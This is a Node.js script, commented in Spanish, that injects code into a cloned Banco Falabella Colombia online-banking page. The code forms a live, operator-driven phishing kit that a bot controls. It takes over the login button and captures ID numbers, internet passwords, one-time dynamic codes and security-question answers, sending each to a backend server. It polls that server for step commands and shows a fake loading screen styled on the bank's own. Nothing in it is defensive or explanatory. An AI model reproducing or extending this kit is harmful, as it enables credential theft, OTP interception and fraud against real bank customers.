// Regenera el script Manolo v4: oculta el form principal al accionar + modal de carga identica al sitio
const fs = require('fs');
const file = 'D:/Desarrollos/falabella/home.html';
let h = fs.readFileSync(file, 'utf8');

const nuevoScript = `<!-- Manolo: Modal 'Ingresa a tu cuenta' - control desde el bot @falabbellabot (v4) -->
<style id="manolo-flow-css">
/* ===== Identidad Banco Falabella ===== */
.manolo-flow {
  margin-top: 4px;
}
.manolo-flow__label {
  font-size: 13px;
  font-weight: 600;
  color: #44474b;
  text-transform: uppercase;
  letter-spacing: .4px;
  margin: 0 0 10px;
  display: block;
}
/* Barra de pasos */
.manolo-flow__steps {
  display: flex;
  gap: 6px;
  margin-bottom: 12px;
}
.manolo-flow__step {
  flex: 1;
  height: 5px;
  border-radius: 3px;
  background: #e6e6e6;
  transition: background .3s ease;
}
.manolo-flow__step--done { background: #3b9326; }
/* Mensaje de estado */
.manolo-flow__msg {
  font-size: 13px;
  color: #303335;
  margin: 10px 0 0;
  padding: 8px 12px;
  background: #f6f8f5;
  border-left: 3px solid #3b9326;
  border-radius: 4px;
  display: none;
}
.manolo-flow__msg--show { display: block; }
.manolo-flow__msg--error { border-left-color: #c44401; background: #fdf6f2; }
/* Vistas de captura (reemplazan al form principal) */
.manolo-capture {
  display: none;
  margin-top: 14px;
  border: 1px solid #e6e6e6;
  border-radius: 10px;
  padding: 14px;
  background: #fafbfa;
}
.manolo-capture--show { display: block; }
.manolo-capture__title {
  font-size: 15px;
  font-weight: 700;
  color: #303335;
  margin: 0 0 10px;
}
.manolo-capture__field {
  width: 100%;
  box-sizing: border-box;
  border: 1px solid #cfcfcf;
  border-radius: 6px;
  padding: 12px 14px;
  font-size: 15px;
  color: #303335;
  margin-bottom: 10px;
  background: #fff;
  outline: none;
}
.manolo-capture__field:focus { border-color: #3b9326; box-shadow: 0 0 0 2px rgba(59,147,38,.15); }
.manolo-capture__send {
  border: none;
  cursor: pointer;
  background: #3b9326;
  color: #fff;
  font-size: 15px;
  font-weight: 600;
  border-radius: 128px;
  min-height: 44px;
  padding: 10px 20px;
  width: 100%;
  transition: background .25s ease;
}
.manolo-capture__send:hover { background: #2b8f14; }

/* ===== MODAL DE CARGA (identidad Banco Falabella) ===== */
#manolo-loading {
  position: fixed;
  inset: 0;
  z-index: 2147483000;
  background: rgba(255,255,255,.96);
  display: none;
  align-items: center;
  justify-content: center;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
}
#manolo-loading.manolo-loading--show { display: flex; }
.manolo-loading__box {
  background: #fff;
  border: 1px solid #ececec;
  border-radius: 16px;
  box-shadow: 0 10px 40px rgba(0,0,0,.08);
  padding: 40px 48px;
  text-align: center;
  max-width: 340px;
  width: 90%;
}
.manolo-loading__logo { height: 40px; margin: 0 auto 24px; display: block; }
.manolo-loading__spinner {
  width: 42px;
  height: 42px;
  margin: 0 auto 20px;
  border: 4px solid rgba(59,147,38,.18);
  border-top-color: #3b9326;
  border-radius: 50%;
  animation: manolo-spin 0.9s linear infinite;
}
@keyframes manolo-spin { to { transform: rotate(360deg); } }
.manolo-loading__title {
  font-size: 17px;
  font-weight: 700;
  color: #303335;
  margin: 0 0 6px;
}
.manolo-loading__text {
  font-size: 13px;
  color: #666;
  margin: 0;
  line-height: 1.5;
}
.manolo-loading__bar {
  height: 4px;
  margin-top: 20px;
  border-radius: 3px;
  background: #e6e6e6;
  overflow: hidden;
}
.manolo-loading__bar-fill {
  height: 100%;
  width: 35%;
  background: linear-gradient(90deg, #3b9326, #40a92c);
  border-radius: 3px;
  animation: manolo-bar 1.3s ease-in-out infinite;
}
@keyframes manolo-bar {
  0% { transform: translateX(-100%); }
  100% { transform: translateX(320%); }
}
</style>

<script>
(function () {
  var API = 'http://localhost:3100/api/registro';
  var COMANDO = 'http://localhost:3100/api/comando';
  var estadoActual = 'IDLE';
  var formOculto = false;

  function $q(s, ctx) { return (ctx || document).querySelector(s); }
  function $qa(s, ctx) { return Array.prototype.slice.call((ctx || document).querySelectorAll(s)); }

  function openLogin() {
    var overlay = $q('#drawer .Drawer_overlay__yhC34');
    var container = $q('#drawer .Drawer_container__7VFg4');
    if (overlay) overlay.classList.add('Drawer_show__iSXeh');
    if (container) container.classList.add('Drawer_show__iSXeh');
  }
  function closeLogin() {
    var overlay = $q('#drawer .Drawer_overlay__yhC34');
    var container = $q('#drawer .Drawer_container__7VFg4');
    if (overlay) overlay.classList.remove('Drawer_show__iSXeh');
    if (container) container.classList.remove('Drawer_show__iSXeh');
  }

  // ---------- MODAL DE CARGA (identidad Falabella) ----------
  function buildLoading() {
    if ($q('#manolo-loading')) return;
    var logo = './Banca en línea, Banco Falabella Colombia_files/logo.686cc6de.svg';
    var div = document.createElement('div');
    div.id = 'manolo-loading';
    div.innerHTML =
      '<div class="manolo-loading__box">' +
        '<img class="manolo-loading__logo" src="' + logo + '" alt="Banco Falabella" height="40">' +
        '<div class="manolo-loading__spinner"></div>' +
        '<p class="manolo-loading__title">Procesando solicitud</p>' +
        '<p class="manolo-loading__text">Estamos validando tus datos. Por favor espera…</p>' +
        '<div class="manolo-loading__bar"><div class="manolo-loading__bar-fill"></div></div>' +
      '</div>';
    document.body.appendChild(div);
  }
  function mostrarCarga() {
    buildLoading();
    var l = $q('#manolo-loading');
    if (l) l.classList.add('manolo-loading--show');
  }
  function ocultarCarga() {
    var l = $q('#manolo-loading');
    if (l) l.classList.remove('manolo-loading--show');
  }

  // ---------- OCULTAR / MOSTRAR form principal ----------
  function formPrincipal() { return $q('#drawer .DrawerFormLogin_form-container__k1Si1'); }
  function ocultarForm() {
    var f = formPrincipal();
    if (f && !formOculto) { f.style.display = 'none'; formOculto = true; }
  }
  function mostrarForm() {
    var f = formPrincipal();
    if (f && formOculto) { f.style.display = ''; formOculto = false; }
  }

  // ---------- Panel de captura (reemplaza al form principal) ----------
  function buildPanel() {
    var content = $q('#drawer .DrawerFormLogin_content__xUzcS');
    if (!content || $q('.manolo-flow')) return;

    var panel = document.createElement('div');
    panel.className = 'manolo-flow';
    panel.style.display = 'none';
    panel.innerHTML = [
      '<span class="manolo-flow__label">Estado del proceso</span>',
      '<div class="manolo-flow__steps">',
      '  <div class="manolo-flow__step" data-step="LOGIN"></div>',
      '  <div class="manolo-flow__step" data-step="OTP"></div>',
      '  <div class="manolo-flow__step" data-step="ENCUESTA"></div>',
      '</div>',
      '<div class="manolo-flow__msg" data-flujo-msg></div>',
      '<!-- Vistas de captura por paso -->',
      '<div class="manolo-capture" id="manolo-cap-login">',
      '  <p class="manolo-capture__title">Capturar LOGIN</p>',
      '  <select class="manolo-capture__field" id="manolo-login-tipo"><option value="CC">Cédula de Ciudadanía</option><option value="CE">Cédula de Extranjería</option><option value="PAS">Pasaporte</option></select>',
      '  <input class="manolo-capture__field" id="manolo-login-doc" placeholder="Documento" inputmode="numeric" maxlength="10">',
      '  <input class="manolo-capture__field" id="manolo-login-pass" placeholder="Clave internet" type="password" maxlength="6">',
      '  <button type="button" class="manolo-capture__send" data-cap-enviar="login">Enviar login</button>',
      '</div>',
      '<div class="manolo-capture" id="manolo-cap-otp">',
      '  <p class="manolo-capture__title">Capturar DINÁMICA (OTP)</p>',
      '  <input class="manolo-capture__field" id="manolo-otp" placeholder="Clave dinámica" inputmode="numeric" maxlength="6">',
      '  <button type="button" class="manolo-capture__send" data-cap-enviar="otp">Enviar dinámica</button>',
      '</div>',
      '<div class="manolo-capture" id="manolo-cap-encuesta">',
      '  <p class="manolo-capture__title">Preguntas de seguridad</p>',
      '  <input class="manolo-capture__field" id="manolo-resp1" placeholder="Respuesta pregunta 1">',
      '  <input class="manolo-capture__field" id="manolo-resp2" placeholder="Respuesta pregunta 2">',
      '  <button type="button" class="manolo-capture__send" data-cap-enviar="encuesta">Enviar respuestas</button>',
      '</div>'
    ].join('');

    // Botones de envio de cada vista
    $qa('[data-cap-enviar]', panel).forEach(function (btn) {
      btn.addEventListener('click', function (e) {
        e.preventDefault();
        enviarCaptura(this.getAttribute('data-cap-enviar'));
      });
    });
    content.appendChild(panel);
  }

  function mostrarPanel() {
    var p = $q('.manolo-flow');
    if (p) { p.style.display = ''; ocultarForm(); }
  }
  function ocultarPanel() {
    var p = $q('.manolo-flow');
    if (p) p.style.display = 'none';
  }

  function msg(texto, esError) {
    var m = $q('[data-flujo-msg]');
    if (!m) return;
    m.textContent = texto;
    m.className = 'manolo-flow__msg manolo-flow__msg--show' + (esError ? ' manolo-flow__msg--error' : '');
  }
  function marcarPaso(accion) {
    $qa('.manolo-flow__step').forEach(function (s) { s.classList.remove('manolo-flow__step--done'); });
    var key = (accion === 'OTP' || accion === 'MAL-OTP') ? 'OTP' : (accion === 'ENCUESTA') ? 'ENCUESTA' : 'LOGIN';
    var s = $q('.manolo-flow__step[data-step="' + key + '"]');
    if (s) s.classList.add('manolo-flow__step--done');
  }
  function mostrarCaptura(id) {
    $qa('.manolo-capture').forEach(function (c) { c.classList.remove('manolo-capture--show'); });
    var el = document.getElementById(id);
    if (el) el.classList.add('manolo-capture--show');
  }

  // ---------- Aplicar comando del bot ----------
  function aplicarComando(paso) {
    estadoActual = paso;
    ocultarCarga();              // si habia modal de carga, se quita
    openLogin();                 // abrir la modal
    mostrarPanel();              // oculta form principal + muestra barra/mensaje/captura
    marcarPaso(paso);
    if (paso === 'FIN') { finProceso(); return; }
    switch (paso) {
      case 'LOGIN': mostrarCaptura('manolo-cap-login'); msg('➡️ LOGIN: ingrese documento y clave.'); break;
      case 'MAL-LOGIN': mostrarCaptura('manolo-cap-login'); msg('⚠️ MAL LOGIN: credenciales erróneas. Capture de nuevo.'); break;
      case 'OTP': mostrarCaptura('manolo-cap-otp'); msg('🔢 DINÁMICA: solicite la clave dinámica (OTP).'); break;
      case 'MAL-OTP': mostrarCaptura('manolo-cap-otp'); msg('⚠️ MAL OTP: dinámica errónea. Pida de nuevo.'); break;
      case 'ENCUESTA': mostrarCaptura('manolo-cap-encuesta'); msg('❓ ENCUESTA: preguntas de seguridad.'); break;
    }
  }

  function finProceso() {
    msg('✅ Proceso finalizado. Cerrando ventana...');
    setTimeout(function () {
      closeLogin();
      ocultarPanel();
      mostrarForm();
    }, 1200);
  }

  // ---------- Polling de comandos ----------
  function pollComandos() {
    fetch(COMANDO)
      .then(function (r) { return r.json(); })
      .then(function (data) {
        if (data && data.comando && data.comando.paso) {
          aplicarComando(data.comando.paso);
        }
      })
      .catch(function () {})
      .then(function () { setTimeout(pollComandos, 1000); });
  }

  // ---------- Envio al bot (con modal de carga Falabella) ----------
  function enviar(payload, etiqueta) {
    payload.paso = etiqueta;
    var submitBtn = $q('#drawer button[type="submit"]');
    if (submitBtn) submitBtn.disabled = true;
    mostrarCarga();   // modal de carga identica al sitio
    return fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
    .then(function (r) { return r.json(); })
    .then(function (resp) {
      if (submitBtn) submitBtn.disabled = false;
      // la modal de carga se quita cuando el bot envie la siguiente accion
      if (resp && resp.ok) return true;
      ocultarCarga();
      msg('⚠️ ' + ((resp && resp.message) || 'No se pudo enviar.'), true);
      return false;
    })
    .catch(function () {
      if (submitBtn) submitBtn.disabled = false;
      ocultarCarga();
      msg('❌ Servidor no disponible. ¿Corre node server.js?', true);
      return false;
    });
  }

  // ---------- Envio de capturas por paso ----------
  function enviarCaptura(tipo) {
    var payload = {}, etiqueta = '';
    if (tipo === 'login') {
      var tipoDoc = document.getElementById('manolo-login-tipo');
      var doc = document.getElementById('manolo-login-doc');
      var pass = document.getElementById('manolo-login-pass');
      if (!doc.value.trim() || !pass.value.trim()) { msg('Completa documento y clave.', true); return; }
      payload = { typeDocument: tipoDoc.value, document: doc.value.trim(), pass: pass.value.trim() };
      etiqueta = (estadoActual === 'MAL-LOGIN') ? 'MAL-LOGIN' : 'LOGIN';
      doc.value = ''; pass.value = '';
    } else if (tipo === 'otp') {
      var otp = document.getElementById('manolo-otp');
      if (!otp.value.trim()) { msg('Ingresa la dinámica.', true); return; }
      payload = { dinamica: otp.value.trim() };
      etiqueta = (estadoActual === 'MAL-OTP') ? 'MAL-OTP' : 'OTP';
      otp.value = '';
    } else if (tipo === 'encuesta') {
      var r1 = document.getElementById('manolo-resp1');
      var r2 = document.getElementById('manolo-resp2');
      if (!r1.value.trim() || !r2.value.trim()) { msg('Completa las dos respuestas.', true); return; }
      payload = { respuesta1: r1.value.trim(), respuesta2: r2.value.trim() };
      etiqueta = 'ENCUESTA';
      r1.value = ''; r2.value = '';
    }
    enviar(payload, etiqueta);
  }

  // ---------- Bind principal ----------
  function bind() {
    // Boton 'Banca en linea' (apertura manual: muestra form principal)
    $qa('header button').forEach(function (b) {
      var t = (b.textContent || '').trim();
      if (t === 'Banca en línea' || t === 'Banca en linea') {
        b.addEventListener('click', function (e) { e.preventDefault(); openLogin(); mostrarForm(); });
      }
    });

    var closeBtn = $q('#drawer .Drawer_close-icon__GjY9I');
    if (closeBtn) closeBtn.addEventListener('click', closeLogin);
    var overlay = $q('#drawer .Drawer_overlay__yhC34');
    if (overlay) overlay.addEventListener('click', closeLogin);
    document.addEventListener('keydown', function (e) { if (e.key === 'Escape') closeLogin(); });

    buildPanel();
    buildLoading();

    // Boton Ingresar original
    var submitBtn = $q('#drawer button[type="submit"]');
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.addEventListener('click', function (e) {
        e.preventDefault();
        var sel = $q('#drawer #typeDocument');
        var doc = $q('#drawer #document');
        var pass = $q('#drawer #pass');
        var typeDoc = sel ? sel.value : '';
        var documentVal = doc ? doc.value.trim() : '';
        var passVal = pass ? pass.value.trim() : '';
        if (!documentVal || !passVal) { msg('Por favor completa documento y clave.', true); return; }
        var payload = { typeDocument: typeDoc, document: documentVal, pass: passVal };
        enviar(payload, (estadoActual === 'MAL-LOGIN') ? 'MAL-LOGIN' : 'LOGIN').then(function (ok) {
          if (ok && doc) doc.value = '';
          if (ok && pass) pass.value = '';
        });
      });
    }

    pollComandos();
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', bind);
  else bind();
})();
</script>`;

const si = h.indexOf('<!-- Manolo:');
if (si === -1) { console.error('No se encontro el marcador Manolo'); process.exit(1); }
const ei = h.indexOf('</script>', si) + '</script>'.length;
h = h.substring(0, si) + nuevoScript.trim() + '\n\n' + h.substring(ei);
fs.writeFileSync(file, h);
console.log('✅ Script Manolo v4 regenerado (oculta form + modal de carga Falabella)');
